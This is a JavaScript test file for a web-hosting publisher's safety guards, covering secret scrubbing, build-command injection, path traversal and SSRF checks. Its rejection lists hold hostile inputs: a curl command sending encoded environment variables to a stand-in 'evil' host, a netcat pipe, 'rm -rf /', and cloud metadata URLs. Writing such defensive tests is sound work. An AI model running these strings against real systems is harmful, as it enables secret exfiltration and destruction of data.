'use strict';

/**
 * hosting/safety — guards for the publisher feature. Covers the four HIGH
 * review findings: build-env secret scrub, build-command injection, output-dir
 * path traversal, and SSRF on remote hosts/URLs.
 */

const { test } = require('node:test');
const assert = require('node:assert/strict');

const s = require('../src/services/hosting/safety');

// ── env scrub (cross-tenant secret breach) ───────────────────────────────────
test('scrubbedBuildEnv strips platform secrets, keeps PATH + adds extras', () => {
  const base = {
    PATH: '/usr/bin', HOME: '/home/u',
    ENCRYPTION_KEY: 'aes-secret', JWT_SECRET: 'jwt', STRIPE_SECRET_KEY: 'rk_live_x',
    DATABASE_URL: 'postgres://...', REDIS_URL: 'redis://...', OPENAI_API_KEY: 'sk-x',
  };
  const env = s.scrubbedBuildEnv({ VITE_API: 'https://api.example' }, base);
  assert.equal(env.PATH, '/usr/bin');
  assert.equal(env.HOME, '/home/u');
  assert.equal(env.VITE_API, 'https://api.example');
  assert.equal(env.CI, '1');
  for (const leaked of ['ENCRYPTION_KEY', 'JWT_SECRET', 'STRIPE_SECRET_KEY', 'DATABASE_URL', 'REDIS_URL', 'OPENAI_API_KEY']) {
    assert.equal(env[leaked], undefined, `${leaked} must NOT pass into an untrusted build`);
  }
});

// ── build-command injection (platform RCE) ───────────────────────────────────
test('assertSafeBuildCommand allows real build commands', () => {
  for (const ok of ['npm run build', 'vite build --mode production', 'next build', 'pnpm build', 'yarn build', undefined, null, '']) {
    assert.doesNotThrow(() => s.assertSafeBuildCommand(ok), `should allow: ${ok}`);
  }
});

test('assertSafeBuildCommand rejects shell-metacharacter injection', () => {
  for (const bad of [
    'true; curl https://evil -d "$(printenv|base64)"',
    'npm run build && curl evil',
    'x | nc evil 1234',
    'x `id`',
    'x $(id)',
    'x > /etc/passwd',
    'x\nrm -rf /',
  ]) {
    assert.throws(() => s.assertSafeBuildCommand(bad), /no permitidos|largo/, `should reject: ${bad}`);
  }
});

// ── output-dir path traversal ────────────────────────────────────────────────
test('assertSafeRelPath allows in-workspace dirs, rejects escapes', () => {
  for (const ok of ['dist', 'build', 'out', '.', 'packages/web/dist', undefined, '']) {
    assert.doesNotThrow(() => s.assertSafeRelPath(ok));
  }
  for (const bad of ['../etc', '../../secrets', '/etc/passwd', 'a/../../b', 'C:\\Windows']) {
    assert.throws(() => s.assertSafeRelPath(bad), /absoluto|inválido/);
  }
});

// ── remote path / nginx webroot injection ────────────────────────────────────
test('assertSafeRemotePath allows posix paths, rejects nginx/shell metachars', () => {
  for (const ok of ['/var/www/site', '/public_html', 'public_html/app']) {
    assert.doesNotThrow(() => s.assertSafeRemotePath(ok));
  }
  for (const bad of ['/var/www/x;}\nserver{', '/x${IFS}', '/a/../b', '/x;rm', '/x }']) {
    assert.throws(() => s.assertSafeRemotePath(bad), /inválido/);
  }
});

// ── SSRF guard ───────────────────────────────────────────────────────────────
test('ipIsPrivate classifies internal/reserved ranges', () => {
  for (const p of ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1', '169.254.169.254', '0.0.0.0', '::1', 'fe80::1', 'fc00::1', '::ffff:127.0.0.1', '100.64.0.1']) {
    assert.equal(s.ipIsPrivate(p), true, `${p} should be private/reserved`);
  }
  for (const pub of ['8.8.8.8', '1.1.1.1', '62.72.11.231', '2606:4700:4700::1111']) {
    assert.equal(s.ipIsPrivate(pub), false, `${pub} should be public`);
  }
});

test('assertSafeRemoteHost rejects IP literals in internal ranges', async () => {
  for (const bad of ['127.0.0.1', '169.254.169.254', '10.1.2.3', '192.168.0.5']) {
    await assert.rejects(() => s.assertSafeRemoteHost(bad), /interna|reservada|no permitido/);
  }
  await assert.doesNotReject(() => s.assertSafeRemoteHost('62.72.11.231'));
});

test('assertSafeRemoteHost resolves hostnames and rejects internal resolutions', async () => {
  const internalLookup = async () => [{ address: '169.254.169.254', family: 4 }];
  const publicLookup = async () => [{ address: '62.72.11.231', family: 4 }];
  await assert.rejects(() => s.assertSafeRemoteHost('evil.example', { lookup: internalLookup }), /interna|reservada|no permitido/);
  await assert.doesNotReject(() => s.assertSafeRemoteHost('my-vps.example', { lookup: publicLookup }));
});

test('assertSafeUrl blocks internal targets, allows public http/https', async () => {
  const internalLookup = async () => [{ address: '127.0.0.1', family: 4 }];
  const publicLookup = async () => [{ address: '8.8.8.8', family: 4 }];
  await assert.rejects(() => s.assertSafeUrl('http://169.254.169.254/latest/meta-data/'), /interna|reservada|no permitido/);
  await assert.rejects(() => s.assertSafeUrl('http://internal.svc', { lookup: internalLookup }), /interna|reservada|no permitido/);
  await assert.rejects(() => s.assertSafeUrl('ftp://example.com'), /http/);
  await assert.doesNotReject(() => s.assertSafeUrl('https://example.com', { lookup: publicLookup }));
});
